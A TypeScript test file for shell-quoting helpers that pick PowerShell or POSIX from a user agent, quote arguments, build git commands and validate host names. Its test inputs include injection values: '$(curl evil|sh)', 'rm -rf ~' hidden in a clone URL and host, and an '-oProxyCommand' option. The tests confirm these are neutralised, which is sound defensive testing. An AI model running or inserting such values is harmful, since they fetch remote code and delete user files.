import { describe, expect, it } from "vitest";
import { safeHost, shellCommand, shellOf, shellQuote } from "./shell";

describe("shell commands", () => {
  it("picks PowerShell on Windows, a POSIX shell elsewhere", () => {
    expect(shellOf("Mozilla/5.0 (Windows NT 10.0; Win64; x64)")).toBe("powershell");
    expect(shellOf("Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0)")).toBe("posix");
    expect(shellOf("Mozilla/5.0 (X11; Linux x86_64)")).toBe("posix");
  });

  it("quotes so nothing expands", () => {
    expect(shellQuote("/w/$(curl evil|sh)", "posix")).toBe("'/w/$(curl evil|sh)'");
    expect(shellQuote("it's", "posix")).toBe("'it'\\''s'");
    expect(shellQuote("C:\\w\\$(x)`y", "powershell")).toBe("'C:\\w\\$(x)`y'");
    expect(shellQuote("it's", "powershell")).toBe("'it''s'");
    expect(shellQuote("it\u2019s", "powershell")).toBe("'it\u2019\u2019s'");
    expect(shellQuote("", "posix")).toBe("''");
  });

  it("leaves plain words alone and quotes the rest", () => {
    expect(shellCommand(["git", "-C", "/Users/kim/acme-api", "fetch"], "posix")).toBe(
      "git -C /Users/kim/acme-api fetch",
    );
    expect(shellCommand(["git", "-C", "/Users/Jane Doe/My Repo", "fetch"], "posix")).toBe(
      "git -C '/Users/Jane Doe/My Repo' fetch",
    );
    expect(shellCommand(["git", "clone", "--", "https://h/o/$(x).git;rm -rf ~"], "posix")).toBe(
      "git clone -- 'https://h/o/$(x).git;rm -rf ~'",
    );
    expect(shellCommand(["git", "-C", "C:\\Users\\kim\\repo", "fetch"], "powershell")).toBe(
      "git -C C:\\Users\\kim\\repo fetch",
    );
    expect(shellCommand(["git", "-C", "C:\\My Repo\\it's", "fetch"], "powershell")).toBe(
      "git -C 'C:\\My Repo\\it''s' fetch",
    );
    expect(shellCommand(["echo", "*", "=ls", "~"], "posix")).toBe("echo '*' '=ls' '~'");
  });

  it("takes host names only", () => {
    expect(safeHost("github.com")).toBe("github.com");
    expect(safeHost("git.acme-corp.internal")).toBe("git.acme-corp.internal");
    for (const bad of ["evil;rm -rf ~", "$(x)", "-oProxyCommand=x", "a b", "h`x`", ""])
      expect(safeHost(bad)).toBeNull();
  });
});
